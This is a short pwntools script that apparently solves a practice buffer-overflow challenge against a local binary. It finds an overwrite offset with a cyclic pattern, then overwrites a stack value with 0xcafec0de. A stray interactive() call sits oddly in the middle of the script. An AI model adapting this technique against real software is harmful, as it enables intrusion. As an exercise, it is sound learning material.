#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF('./vuln', checksec=False)

# first process used to find the position of the hex number
io = elf.process()

# sending payload
# 0x400 = 1024
payload = cyclic(0x400)
io.sendlineafter(b':)\n', payload)

io.recvuntil(b'with ')

# isolating the number and finding its position
number = int(io.recvuntil(b' ').strip().decode(), 16) 
io.interactive()
pos = cyclic_find(number)

# second process used to replace the hex number @pos with ours
io = elf.process()
io.sendlineafter(b':)\n', flat({pos: 0xcafec0de}))
io.recvline()

print(io.recvall())
